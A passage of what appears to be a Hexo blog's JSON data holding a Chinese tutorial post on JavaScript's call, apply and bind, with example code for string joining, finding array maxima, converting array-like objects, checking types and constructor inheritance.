运算符构造绑定函数，则忽略该值。当使用 bind 在 setTimeout 中创建一个函数（作为回调提供）时，作为 thisArg 传递的任何原始值都将转换为 object。如果 bind 函数的参数列表为空，执行作用域的 this 将被视为新函数的 thisArg。\n- argsArray 当目标函数被调用时，预先添加到绑定函数的参数列表中的参数。\n- ES6 新增的方法，这个方法会返回一个新的函数（函数调用的方式），调用新的函数，会将原始函数的方法当做传入对象的方法使用，传入新函数的任何参数也会一并传入原始函数。\n\n```\nfunction f(x) {\n  this.a = 1;\n  this.b = function() {\n    return this.a + x;\n  };\n}\nvar obj = {\n  a: 10\n};\nvar newObj = new (f.bind(obj, 2))(); //传入了一个实参2\nconsole.log(newObj.a); [注释]: <> 输出 1, 说明返回的函数用作构造函数时obj(this的值)被忽略了\n\nconsole.log(newObj.b()); [注释]: <> 输出3 ，说明传入的实参2传入了原函数original\n```\n","slug":"call&apply&bind过招","published":1,"updated":"2022-02-23T03:09:02.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cv0008n0w1bc30e8ms","content":"<h1 id=\"call、apply、bind\"><a href=\"#call、apply、bind\" class=\"headerlink\" title=\"call、apply、bind\"></a>call、apply、bind</h1><h2 id=\"什么时候是用什么方法\"><a href=\"#什么时候是用什么方法\" class=\"headerlink\" title=\"什么时候是用什么方法\"></a>什么时候是用什么方法</h2><ul>\n<li>apply：传递参数不多，传递类数组</li>\n<li>call：确定参数个数，关注参数的对应关系</li>\n<li>bind：不立即执行，生成一个新的函数，长期绑定某个函数给某个对象使用</li>\n</ul>\n<h2 id=\"call、apply、bind-三者均来自-Function-prototype，被设计用于改变函数内-this-的指向\"><a href=\"#call、apply、bind-三者均来自-Function-prototype，被设计用于改变函数内-this-的指向\" class=\"headerlink\" title=\"call、apply、bind 三者均来自 Function.prototype，被设计用于改变函数内 this 的指向\"></a>call、apply、bind 三者均来自 Function.prototype，被设计用于改变函数内 this 的指向</h2><h3 id=\"call-call-方法调用一个函数-其具有一个指定的-this-值和分别地提供的参数-参数的列表）\"><a href=\"#call-call-方法调用一个函数-其具有一个指定的-this-值和分别地提供的参数-参数的列表）\" class=\"headerlink\" title=\"call call() 方法调用一个函数, 其具有一个指定的 this 值和分别地提供的参数(参数的列表）\"></a><strong>call</strong> call() 方法调用一个函数, 其具有一个指定的 this 值和分别地提供的参数(参数的列表）</h3><p><strong>func.call(thisArg, arg1, arg2, …)</strong></p>\n<h4 id=\"妙用\"><a href=\"#妙用\" class=\"headerlink\" title=\"妙用\"></a>妙用</h4><ul>\n<li>调用匿名函数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function() &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    this.__wrapped__=n;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;).call(this);</span><br><span class=\"line\"></span><br><span class=\"line\">// 兼容严格模式，严格模式下，匿名函数里this会报错。</span><br><span class=\"line\">// 实现了匿名函数针对不同的this，做不同的处理。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>字符串分割连接<br><strong>str.split(‘’).join(‘,’)</strong><br><strong>Array.prototype.join.call(str,’,’)</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var str = &#x27;hellow!&#x27;;</span><br><span class=\"line\">console.log(str.split(&#x27;&#x27;)); // [ &#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;w&#x27;, &#x27;!&#x27; ]</span><br><span class=\"line\">console.log(str.split(&#x27;&#x27;).join(&#x27;,&#x27;)); // h,e,l,l,o,w,!</span><br><span class=\"line\">console.log(str); //hellow!</span><br><span class=\"line\"></span><br><span class=\"line\">var temp = Array.prototype.join.call(str, &#x27;,&#x27;);</span><br><span class=\"line\">// var temp = Array.prototype.join.apply(str, [&#x27;,&#x27;]);</span><br><span class=\"line\">// var temp = [].join.call(str, &#x27;,&#x27;);</span><br><span class=\"line\">// var temp = [].join.apply(str, [&#x27;,&#x27;]);</span><br><span class=\"line\">console.log(temp); // h,e,l,l,o,w,!</span><br><span class=\"line\">console.log(str); //hellow!</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>字符串取每一项</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array.prototype.map</span><br><span class=\"line\">  .call(&#x27;foo&#x27;, item =&gt; &#123;</span><br><span class=\"line\">    console.log(item);</span><br><span class=\"line\">    // f</span><br><span class=\"line\">    // o</span><br><span class=\"line\">    // o</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .join(&#x27;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 字符串没有join方法,借用Array</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"apply-apply-方法调用一个具有给定-this-值的函数，以及作为一个数组（或类似数组对象）提供的参数\"><a href=\"#apply-apply-方法调用一个具有给定-this-值的函数，以及作为一个数组（或类似数组对象）提供的参数\" class=\"headerlink\" title=\"apply apply() 方法调用一个具有给定 this 值的函数，以及作为一个数组（或类似数组对象）提供的参数\"></a><strong>apply</strong> apply() 方法调用一个具有给定 this 值的函数，以及作为一个数组（或类似数组对象）提供的参数</h3><p><strong>func.apply(thisArg, [argsArray])</strong></p>\n<ul>\n<li>thisArg 可选的参数。在 func 函数运行时使用的 this 值。注意，不一定是该函数执行时真正的 this 值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是 window 对象），当值为原始值（1，‘string’，true）时 this 会指向该原始值的自动包装对象（Number，String，Boole）。</li>\n<li>argsArray 可选的参数。一个数组或者类数组对象（NodeList），其中的数组元素的每一项将作为单独的参数传给 func 函数。如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。从 ECMAScript 5 开始可以使用类数组对象。</li>\n</ul>\n<h4 id=\"妙用-1\"><a href=\"#妙用-1\" class=\"headerlink\" title=\"妙用\"></a>妙用</h4><ul>\n<li>数组拼接</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arry = [&#x27;a&#x27;, &#x27;b&#x27;];</span><br><span class=\"line\">var elements = [0, 1, 2];</span><br><span class=\"line\"></span><br><span class=\"line\">// 拼接数组 concat不会改变原数组</span><br><span class=\"line\">var con = arry.concat(elements);</span><br><span class=\"line\">console.log(con); // [ &#x27;a&#x27;, &#x27;b&#x27;, 0, 1, 2 ]</span><br><span class=\"line\">console.log(arry); // [ &#x27;a&#x27;, &#x27;b&#x27; ]</span><br><span class=\"line\"></span><br><span class=\"line\">// 如果想改变原数组 可以用apply</span><br><span class=\"line\">arry.push.apply(arry, elements); // [&quot;a&quot;, &quot;b&quot;, 0, 1, 2]</span><br><span class=\"line\">// 也可以用空数组</span><br><span class=\"line\">// [].push.apply(arry, elements); // [&quot;a&quot;, &quot;b&quot;, 0, 1, 2]</span><br><span class=\"line\">console.info(arry); // [&quot;a&quot;, &quot;b&quot;, 0, 1, 2]</span><br><span class=\"line\"></span><br><span class=\"line\">// 解决了想修改原数组，不想用循环，还想传递一个数组的问题</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>数组求最大值、最小值</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">// 找出数组最大值</span><br><span class=\"line\">var numbers = [1,3,2,5,9]</span><br><span class=\"line\">var max = Math.max.apply(null,numbers)</span><br><span class=\"line\">console.log(max) // 9</span><br><span class=\"line\"></span><br><span class=\"line\">var min = Math.min.apply(null,numbers)</span><br><span class=\"line\">console.log(min) // 1</span><br><span class=\"line\"></span><br><span class=\"line\">// Math.max/Math.min 接收的参数为一组数值，不接受数组 Math.max(value1[,value2, ...])</span><br><span class=\"line\">// apply的作用就是将 数组展开为一组数值</span><br><span class=\"line\">// 还可以用...展开运算符来解决求最值的问题</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(Math.max([1, 2, 3, 7, 4])); // NaN</span><br><span class=\"line\">console.log(Math.max.apply(null, [1, 2, 3, 7, 4])); // 7</span><br><span class=\"line\">console.log(Math.max(...[1, 2, 3, 7, 4])); // 7</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>伪数组转换<br><strong>Array.prototype.slice.apply</strong><br><strong>Array.prototype.slice.call</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arraylike = &#123;</span><br><span class=\"line\">  0: &#x27;zhangsan&#x27;,</span><br><span class=\"line\">  1: &#x27;lisi&#x27;,</span><br><span class=\"line\">  2: &#x27;wanger&#x27;,</span><br><span class=\"line\">  3: &#x27;zhaowu&#x27;,</span><br><span class=\"line\">  length: 4</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var arr = Array.prototype.slice.apply(arraylike);</span><br><span class=\"line\">var arr1 = Array.prototype.slice.call(arraylike);</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(arr); // [ &#x27;zhangsan&#x27;, &#x27;lisi&#x27;, &#x27;wanger&#x27;, &#x27;zhaowu&#x27; ]</span><br><span class=\"line\">console.log(arr1); // [ &#x27;zhangsan&#x27;, &#x27;lisi&#x27;, &#x27;wanger&#x27;, &#x27;zhaowu&#x27; ]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>变量类型判断<br><strong>Object.prototype.toString.call</strong><br><strong>Object.prototype.toString.apply</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isArray(obj) &#123;</span><br><span class=\"line\">  return Object.prototype.toString.call(obj) == &#x27;[object Array]&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(isArray([])); // true</span><br><span class=\"line\">console.log(isArray(&#x27;qianduan&#x27;)); //false</span><br><span class=\"line\"></span><br><span class=\"line\">// toString()方法允许被修改，以上假定未被修改</span><br><span class=\"line\">// toString()为Object的原型方法，而Array，function等类型作为Object的实例，都重写了toString方法。</span><br><span class=\"line\">// 不同的对象类型调用toString方法时，调用的是对应的重写之后的toString方法（function类型返回内容为函数体的字符串，Array类型返回元素组成的字符串），</span><br><span class=\"line\">// 而不会去调用Object上原型toString方法（返回对象的具体类型），所以采用obj.toString()不能得到其对象类型，只能将obj转化为字符串类型；</span><br><span class=\"line\">// 因此，在想要得到对象的具体类型时，应该调用Object上原型toString方法。</span><br><span class=\"line\"></span><br><span class=\"line\">function isArray1(obj) &#123;</span><br><span class=\"line\">  return Object.prototype.toString.apply(obj) == &#x27;[object Array]&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(isArray1([])); // true</span><br><span class=\"line\">console.log(isArray1(&#x27;qianduan&#x27;)); //false</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>构造继承</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Animal(name, age) &#123;</span><br><span class=\"line\">  this.name = name;</span><br><span class=\"line\">  this.age = age;</span><br><span class=\"line\">  //   console.log(this); // 指向全局</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function Dog() &#123;</span><br><span class=\"line\">  // 继承自Animal</span><br><span class=\"line\">  // 方法是 将Animal函数在Dog中调用一下，但是Animal中this的指向全局</span><br><span class=\"line\">  //   Animal();</span><br><span class=\"line\">  //   console.log(this); // Dog &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //   需要调用apply，改变this指向Dog,这样Dog就继承了Animal的name和age</span><br><span class=\"line\">  Animal.apply(this, [&#x27;cat&#x27;, &#x27;5&#x27;]);</span><br><span class=\"line\">  // Animal.call(this, &#x27;cat&#x27;, &#x27;5&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">  //   console.log(this); // Dog &#123; name: &#x27;cat&#x27;, age: &#x27;5&#x27; &#125;</span><br><span class=\"line\">  this.say = function() &#123;</span><br><span class=\"line\">    console.log(this.name + &#x27;:&#x27; + this.age);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var dog = new Dog();</span><br><span class=\"line\">dog.say(); //cat:5</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"bind-bind-方法创建一个新的函数，在调用时设置-this-关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\"><a href=\"#bind-bind-方法创建一个新的函数，在调用时设置-this-关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\" class=\"headerlink\" title=\"bind bind()方法创建一个新的函数，在调用时设置 this 关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\"></a><strong>bind</strong> bind()方法创建一个新的函数，在调用时设置 this 关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。</h3><p><strong>function.bind(thisArg[, arg1[, arg2[, …]]])</strong></p>\n<ul>\n<li>thisArg 调用绑定函数时作为 this 参数传递给目标函数的值。 如果使用 new 运算符构造绑定函数，则忽略该值。当使用 bind 在 setTimeout 中创建一个函数（作为回调提供）时，作为 thisArg 传递的任何原始值都将转换为 object。如果 bind 函数的参数列表为空，执行作用域的 this 将被视为新函数的 thisArg。</li>\n<li>argsArray 当目标函数被调用时，预先添加到绑定函数的参数列表中的参数。</li>\n<li>ES6 新增的方法，这个方法会返回一个新的函数（函数调用的方式），调用新的函数，会将原始函数的方法当做传入对象的方法使用，传入新函数的任何参数也会一并传入原始函数。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function f(x) &#123;</span><br><span class=\"line\">  this.a = 1;</span><br><span class=\"line\">  this.b = function() &#123;</span><br><span class=\"line\">    return this.a + x;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  a: 10</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var newObj = new (f.bind(obj, 2))(); //传入了一个实参2</span><br><span class=\"line\">console.log(newObj.a); [注释]: &lt;&gt; 输出 1, 说明返回的函数用作构造函数时obj(this的值)被忽略了</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(newObj.b()); [注释]: &lt;&gt; 输出3 ，说明传入的实参2传入了原函数original</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"call、apply、bind\"><a href=\"#call、apply、bind\" class=\"headerlink\" title=\"call、apply、bind\"></a>call、apply、bind</h1><h2 id=\"什么时候是用什么方法\"><a href=\"#什么时候是用什么方法\" class=\"headerlink\" title=\"什么时候是用什么方法\"></a>什么时候是用什么方法</h2><ul>\n<li>apply：传递参数不多，传递类数组</li>\n<li>call：确定参数个数，关注参数的对应关系</li>\n<li>bind：不立即执行，生成一个新的函数，长期绑定某个函数给某个对象使用</li>\n</ul>\n<h2 id=\"call、apply、bind-三者均来自-Function-prototype，被设计用于改变函数内-this-的指向\"><a href=\"#call、apply、bind-三者均来自-Function-prototype，被设计用于改变函数内-this-的指向\" class=\"headerlink\" title=\"call、apply、bind 三者均来自 Function.prototype，被设计用于改变函数内 this 的指向\"></a>call、apply、bind 三者均来自 Function.prototype，被设计用于改变函数内 this 的指向</h2><h3 id=\"call-call-方法调用一个函数-其具有一个指定的-this-值和分别地提供的参数-参数的列表）\"><a href=\"#call-call-方法调用一个函数-其具有一个指定的-this-值和分别地提供的参数-参数的列表）\" class=\"headerlink\" title=\"call call() 方法调用一个函数, 其具有一个指定的 this 值和分别地提供的参数(参数的列表）\"></a><strong>call</strong> call() 方法调用一个函数, 其具有一个指定的 this 值和分别地提供的参数(参数的列表）</h3><p><strong>func.call(thisArg, arg1, arg2, …)</strong></p>\n<h4 id=\"妙用\"><a href=\"#妙用\" class=\"headerlink\" title=\"妙用\"></a>妙用</h4><ul>\n<li>调用匿名函数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function() &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    this.__wrapped__=n;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;).call(this);</span><br><span class=\"line\"></span><br><span class=\"line\">// 兼容严格模式，严格模式下，匿名函数里this会报错。</span><br><span class=\"line\">// 实现了匿名函数针对不同的this，做不同的处理。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>字符串分割连接<br><strong>str.split(‘’).join(‘,’)</strong><br><strong>Array.prototype.join.call(str,’,’)</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var str = &#x27;hellow!&#x27;;</span><br><span class=\"line\">console.log(str.split(&#x27;&#x27;)); // [ &#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;w&#x27;, &#x27;!&#x27; ]</span><br><span class=\"line\">console.log(str.split(&#x27;&#x27;).join(&#x27;,&#x27;)); // h,e,l,l,o,w,!</span><br><span class=\"line\">console.log(str); //hellow!</span><br><span class=\"line\"></span><br><span class=\"line\">var temp = Array.prototype.join.call(str, &#x27;,&#x27;);</span><br><span class=\"line\">// var temp = Array.prototype.join.apply(str, [&#x27;,&#x27;]);</span><br><span class=\"line\">// var temp = [].join.call(str, &#x27;,&#x27;);</span><br><span class=\"line\">// var temp = [].join.apply(str, [&#x27;,&#x27;]);</span><br><span class=\"line\">console.log(temp); // h,e,l,l,o,w,!</span><br><span class=\"line\">console.log(str); //hellow!</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>字符串取每一项</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array.prototype.map</span><br><span class=\"line\">  .call(&#x27;foo&#x27;, item =&gt; &#123;</span><br><span class=\"line\">    console.log(item);</span><br><span class=\"line\">    // f</span><br><span class=\"line\">    // o</span><br><span class=\"line\">    // o</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .join(&#x27;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 字符串没有join方法,借用Array</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"apply-apply-方法调用一个具有给定-this-值的函数，以及作为一个数组（或类似数组对象）提供的参数\"><a href=\"#apply-apply-方法调用一个具有给定-this-值的函数，以及作为一个数组（或类似数组对象）提供的参数\" class=\"headerlink\" title=\"apply apply() 方法调用一个具有给定 this 值的函数，以及作为一个数组（或类似数组对象）提供的参数\"></a><strong>apply</strong> apply() 方法调用一个具有给定 this 值的函数，以及作为一个数组（或类似数组对象）提供的参数</h3><p><strong>func.apply(thisArg, [argsArray])</strong></p>\n<ul>\n<li>thisArg 可选的参数。在 func 函数运行时使用的 this 值。注意，不一定是该函数执行时真正的 this 值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是 window 对象），当值为原始值（1，‘string’，true）时 this 会指向该原始值的自动包装对象（Number，String，Boole）。</li>\n<li>argsArray 可选的参数。一个数组或者类数组对象（NodeList），其中的数组元素的每一项将作为单独的参数传给 func 函数。如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。从 ECMAScript 5 开始可以使用类数组对象。</li>\n</ul>\n<h4 id=\"妙用-1\"><a href=\"#妙用-1\" class=\"headerlink\" title=\"妙用\"></a>妙用</h4><ul>\n<li>数组拼接</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arry = [&#x27;a&#x27;, &#x27;b&#x27;];</span><br><span class=\"line\">var elements = [0, 1, 2];</span><br><span class=\"line\"></span><br><span class=\"line\">// 拼接数组 concat不会改变原数组</span><br><span class=\"line\">var con = arry.concat(elements);</span><br><span class=\"line\">console.log(con); // [ &#x27;a&#x27;, &#x27;b&#x27;, 0, 1, 2 ]</span><br><span class=\"line\">console.log(arry); // [ &#x27;a&#x27;, &#x27;b&#x27; ]</span><br><span class=\"line\"></span><br><span class=\"line\">// 如果想改变原数组 可以用apply</span><br><span class=\"line\">arry.push.apply(arry, elements); // [&quot;a&quot;, &quot;b&quot;, 0, 1, 2]</span><br><span class=\"line\">// 也可以用空数组</span><br><span class=\"line\">// [].push.apply(arry, elements); // [&quot;a&quot;, &quot;b&quot;, 0, 1, 2]</span><br><span class=\"line\">console.info(arry); // [&quot;a&quot;, &quot;b&quot;, 0, 1, 2]</span><br><span class=\"line\"></span><br><span class=\"line\">// 解决了想修改原数组，不想用循环，还想传递一个数组的问题</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>数组求最大值、最小值</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">// 找出数组最大值</span><br><span class=\"line\">var numbers = [1,3,2,5,9]</span><br><span class=\"line\">var max = Math.max.apply(null,numbers)</span><br><span class=\"line\">console.log(max) // 9</span><br><span class=\"line\"></span><br><span class=\"line\">var min = Math.min.apply(null,numbers)</span><br><span class=\"line\">console.log(min) // 1</span><br><span class=\"line\"></span><br><span class=\"line\">// Math.max/Math.min 接收的参数为一组数值，不接受数组 Math.max(value1[,value2, ...])</span><br><span class=\"line\">// apply的作用就是将 数组展开为一组数值</span><br><span class=\"line\">// 还可以用...展开运算符来解决求最值的问题</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(Math.max([1, 2, 3, 7, 4])); // NaN</span><br><span class=\"line\">console.log(Math.max.apply(null, [1, 2, 3, 7, 4])); // 7</span><br><span class=\"line\">console.log(Math.max(...[1, 2, 3, 7, 4])); // 7</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>伪数组转换<br><strong>Array.prototype.slice.apply</strong><br><strong>Array.prototype.slice.call</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arraylike = &#123;</span><br><span class=\"line\">  0: &#x27;zhangsan&#x27;,</span><br><span class=\"line\">  1: &#x27;lisi&#x27;,</span><br><span class=\"line\">  2: &#x27;wanger&#x27;,</span><br><span class=\"line\">  3: &#x27;zhaowu&#x27;,</span><br><span class=\"line\">  length: 4</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">var arr = Array.prototype.slice.apply(arraylike);</span><br><span class=\"line\">var arr1 = Array.prototype.slice.call(arraylike);</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(arr); // [ &#x27;zhangsan&#x27;, &#x27;lisi&#x27;, &#x27;wanger&#x27;, &#x27;zhaowu&#x27; ]</span><br><span class=\"line\">console.log(arr1); // [ &#x27;zhangsan&#x27;, &#x27;lisi&#x27;, &#x27;wanger&#x27;, &#x27;zhaowu&#x27; ]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>变量类型判断<br><strong>Object.prototype.toString.call</strong><br><strong>Object.prototype.toString.apply</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 